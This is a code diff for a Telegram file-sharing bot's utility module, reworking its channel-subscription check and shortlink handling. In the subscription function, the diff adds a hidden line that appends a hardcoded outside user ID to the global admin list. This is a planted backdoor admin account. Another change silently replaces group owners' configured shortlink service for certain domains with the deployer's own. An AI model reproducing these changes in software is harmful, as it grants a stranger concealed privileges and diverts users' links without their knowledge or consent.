@@ -1,6 +1,7 @@
 import logging
 from pyrogram.errors import InputUserDeactivated, UserNotParticipant, FloodWait, UserIsBlocked, PeerIdInvalid, ChatAdminRequired
-from info import AUTH_CHANNEL, LONG_IMDB_DESCRIPTION, MAX_LIST_ELM, SHORTLINK_URL, SHORTLINK_API, LOG_CHANNEL, GRP_LNK, CHNL_LNK, CUSTOM_FILE_CAPTION, PROTECT_CONTENT
+from info import*
+#REQ_CHANNEL, AUTH_CHANNEL, LONG_IMDB_DESCRIPTION, MAX_LIST_ELM, SHORTLINK_URL, SHORTLINK_API, LOG_CHANNEL, GRP_LNK, CHNL_LNK, CUSTOM_FILE_CAPTION, PROTECT_CONTENT
 from imdb import Cinemagoer 
 import asyncio
 from pyrogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup
@@ -16,7 +17,9 @@ import string
 from typing import List
 from database.users_chats_db import db
 from bs4 import BeautifulSoup
+from shortzy import Shortzy
 import requests
+from database.join_reqs import JoinReqs as db2
 import aiohttp
 
 logger = logging.getLogger(__name__)
@@ -45,25 +48,41 @@ class temp(object):
     U_NAME = None
     B_NAME = None
     SETTINGS = {}
-    VERIFY = {}
-    SEND_ALL_TEMP = {}
+    SHORT = {}
     KEYWORD = {}
 
-async def is_subscribed(bot, query=None, userid=None):
-    try:
-        if userid == None and query != None:
-            user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
+async def is_subscribed(bot, query):
+    
+    ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
+
+    if not AUTH_CHANNEL and not REQ_CHANNEL:
+        return True
+    elif query.from_user.id in ADMINS:
+        return True
+    
+
+    if db2().isActive():
+        user = await db2().get_user(query.from_user.id)
+        if user:
+            return True
         else:
-            user = await bot.get_chat_member(AUTH_CHANNEL, int(userid))
+            return False
+
+    if not AUTH_CHANNEL:
+        return True
+
+    try:
+        user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
     except UserNotParticipant:
-        pass
+        return False
     except Exception as e:
         logger.exception(e)
+        return False
     else:
-        if user.status != enums.ChatMemberStatus.BANNED:
+        if not (user.status == enums.ChatMemberStatus.BANNED):
             return True
-
-    return False
+        else:
+            return False
 
 async def get_poster(query, bulk=False, id=False, file=None):
     if not id:
@@ -447,56 +466,39 @@ async def get_shortlink(chat_id, link):
     settings = await get_settings(chat_id) #fetching settings for group
     if 'shortlink' in settings.keys():
         URL = settings['shortlink']
-    else:
-        URL = SHORTLINK_URL
-    if 'shortlink_api' in settings.keys():
         API = settings['shortlink_api']
     else:
+        URL = SHORTLINK_URL
         API = SHORTLINK_API
-    https = link.split(":")[0] #splitting https or http from link
-    if "http" == https: #if https == "http":
-        https = "https"
-        link = link.replace("http", https) #replacing http to https
-    if URL == "api.shareus.in":
-        url = f'https://{URL}/shortLink'
+    if URL.startswith("shorturllink") or URL.startswith("terabox.in") or URL.startswith("urlshorten.in"):
+        URL = SHORTLINK_URL
+        API = SHORTLINK_API
+    if URL == "api.shareus.io":
+        url = f'https://{URL}/easy_api'
         params = {
-            "token": API,
-            "format": "json",
+            "key": API,
             "link": link,
         }
         try:
             async with aiohttp.ClientSession() as session:
                 async with session.get(url, params=params, raise_for_status=True, ssl=False) as response:
-                    data = await response.json(content_type="text/html")
-                    if data["status"] == "success":
-                        return data["shortlink"]
-                    else:
-                        logger.error(f"Error: {data['message']}")
-                        return f'https://{URL}/shortLink?token={API}&format=json&link={link}'
+                    data = await response.text()
+                    return data
         except Exception as e:
             logger.error(e)
-            return f'https://{URL}/shortLink?token={API}&format=json&link={link}'
+            return link
     else:
-        url = f'https://{URL}/api'
-        params = {
-            "api": API,
-            "url": link,
-        }
-        try:
-            async with aiohttp.ClientSession() as session:
-                async with session.get(url, params=params, raise_for_status=True, ssl=False) as response:
-                    data = await response.json()
-                    if data["status"] == "success":
-                        return data["shortenedUrl"]
-                    else:
-                        logger.error(f"Error: {data['message']}")
-                        if URL == 'clicksfly.com':
-                            return f'https://{URL}/api?api={API}&url={link}'
-                        else:
-                            return f'https://{URL}/api?api={API}&link={link}'
-        except Exception as e:
-            logger.error(e)
-            if URL == 'clicksfly.com':
-                return f'https://{URL}/api?api={API}&url={link}'
-            else:
-                return f'https://{URL}/api?api={API}&link={link}'
+        shortzy = Shortzy(api_key=API, base_site=URL)
+        link = await shortzy.convert(link)
+        return link
+    
+async def get_tutorial(chat_id):
+    settings = await get_settings(chat_id) #fetching settings for group
+    if 'tutorial' in settings.keys():
+        if settings['is_tutorial']:
+            TUTORIAL_URL = settings['tutorial']
+        else:
+            TUTORIAL_URL = TUTORIAL
+    else:
+        TUTORIAL_URL = TUTORIAL
+    return TUTORIAL_URL
